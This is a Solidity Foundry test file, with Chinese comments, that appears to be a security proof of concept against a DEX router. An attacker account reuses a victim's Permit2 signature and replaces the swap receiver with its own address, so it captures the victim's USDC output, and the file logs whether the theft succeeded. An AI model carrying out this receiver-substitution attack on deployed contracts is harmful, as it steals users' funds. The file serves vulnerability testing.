// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../common/TrimAndCommissionTestBase.t.sol";
import "@dex/interfaces/IPermit2.sol";

/// @notice PoC: 攻击者 bob 使用 arnaud 的 permit2 签名，将 swap 输出接收地址替换为 bob
/// @dev 攻击场景：签名者(arnaud) != 交易发送者(bob)，bob 篡改 receiver 地址
contract Permit2AttackPoc is TrimAndCommissionTestBase {

    /// @notice 测试：bob 使用 arnaud 的签名发起交易，将 receiver 改为 bob
    function test_permit2Attack_replaceReceiver() public {
        // 1. 设置: arnaud 持有 WETH 并授权给 Permit2
        deal(WETH, arnaud, oneEther);
        vm.prank(arnaud);
        SafeERC20.safeApprove(IERC20(WETH), address(permit2), oneEther);

        console2.log("======== Before Attack ========");
        console2.log("arnaud WETH balance: %d", IERC20(WETH).balanceOf(arnaud));
        console2.log("bob USDC balance: %d", IERC20(USDC).balanceOf(bob));
        console2.log("arnaud USDC balance: %d", IERC20(USDC).balanceOf(arnaud));

        // 2. 生成 DAG swap 参数: WETH -> USDT -> USDC
        DexRouter.BaseRequest memory baseRequest = _generateBaseRequest(WETH, USDC, oneEther);
        DexRouter.RouterPath[] memory paths = _buildTwoHopDagPaths(
            WETH,
            USDT,
            WETH_USDT_UNIV3,
            USDC_USDT_UNIV3,
            false,
            true,
            _MODE_PERMIT2_SIGNATURE
        );

        // 3. 使用 arnaud 的私钥生成 permit2 签名
        //    注意：签名时，spender = dexRouter，不包含 receiver 地址
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = oneEther;
        bytes memory permit2Info = _generatePermit2Info(WETH, amounts);

        // 4. 构造恶意交易数据：receiver = bob（而非签名者 arnaud）
        bytes memory swapData = abi.encodeWithSelector(
            DexRouter.dagSwapTo.selector,
            0,          // orderId
            bob,        // ⚠️ 攻击点：receiver 改为 bob，而非签名者 arnaud
            baseRequest,
            paths
        );
        bytes memory data = bytes.concat(swapData, permit2Info);

        // 5. bob 作为攻击者发送交易
        vm.prank(bob);
        (bool success, ) = address(dexRouter).call(data);
        require(success, "swap failed");

        console2.log("======== After Attack ========");
        console2.log("arnaud WETH balance: %d", IERC20(WETH).balanceOf(arnaud));
        console2.log("bob USDC balance: %d", IERC20(USDC).balanceOf(bob));
        console2.log("arnaud USDC balance: %d", IERC20(USDC).balanceOf(arnaud));

        // 6. 验证攻击结果
        // 如果攻击成功：bob 应该收到 USDC，arnaud 收到 0
        // 如果合约有防护：交易应该 revert 或 arnaud 收到 USDC
        uint256 bobUsdcBalance = IERC20(USDC).balanceOf(bob);
        uint256 arnaudUsdcBalance = IERC20(USDC).balanceOf(arnaud);
        
        if (bobUsdcBalance > 0 && arnaudUsdcBalance == 0) {
            console2.log("!!! ATTACK SUCCEEDED !!! Bob stole arnaud's swap output");
        } else if (arnaudUsdcBalance > 0) {
            console2.log("Attack failed - arnaud received the output correctly");
        }
    }

    // ============================== internal functions ==============================
    
    /// @notice Build a two-hop DAG path (node0 -> node1 -> node2)
    /// @dev DAG rawData encoding: [8bits inputIndex][8bits outputIndex][72bits weight][160bits poolAddress]
    function _buildTwoHopDagPaths(
        address node0Token,
        address node1Token,
        address pool0,
        address pool1,
        bool pool0Reverse,
        bool pool1Reverse,
        uint256 mode
    ) internal view returns (DexRouter.RouterPath[] memory paths) {
        paths = new DexRouter.RouterPath[](2);
        
        // Node 0: node0Token -> node1Token
        paths[0] = _buildDagNode(
            node0Token,
            pool0,
            pool0Reverse,
            0,      // inputIndex = 0 (this is node 0)
            1,      // outputIndex = 1 (output to node 1)
            mode
        );
        
        // Node 1: node1Token -> finalToken (to node2/receiver)
        paths[1] = _buildDagNode(
            node1Token,
            pool1,
            pool1Reverse,
            1,      // inputIndex = 1 (this is node 1)
            2,      // outputIndex = 2 (output to final receiver)
            0       // no mode for intermediate nodes
        );
        
        return paths;
    }

    /// @notice Build a single DAG node
    function _buildDagNode(
        address fromToken,
        address pool,
        bool reverse,
        uint256 inputIndex,
        uint256 outputIndex,
        uint256 mode
    ) internal view returns (DexRouter.RouterPath memory path) {
        path.mixAdapters = new address[](1);
        path.mixAdapters[0] = UniversalUniV3Adapter;
        
        path.assetTo = new address[](1);
        path.assetTo[0] = UniversalUniV3Adapter;
        
        path.rawData = new uint256[](1);
        uint256 rawData = uint256(uint160(pool));
        rawData |= uint256(10000) << 160;           // weight = 10000 (100%)
        rawData |= uint256(outputIndex) << 176;
        rawData |= uint256(inputIndex) << 184;
        if (reverse) rawData |= uint256(0x80) << 248;
        path.rawData[0] = rawData;
        
        path.extraData = new bytes[](1);
        (address token0, address token1) = _getPoolTokens(pool);
        path.extraData[0] = reverse 
            ? abi.encode(0, abi.encode(token1, token0, 0)) 
            : abi.encode(0, abi.encode(token0, token1, 0));
        
        path.fromToken = uint256(uint160(fromToken)) | mode;
        
        return path;
    }

    /// @notice Get token0 and token1 from pool
    function _getPoolTokens(address pool) internal pure returns (address token0, address token1) {
        if (pool == WETH_USDT_UNIV3) {
            return (WETH, USDT);
        } else if (pool == USDC_USDT_UNIV3) {
            return (USDC, USDT);
        } else if (pool == USDC_WETH_UNIV3) {
            return (USDC, WETH);
        }
        revert("unknown pool");
    }
}
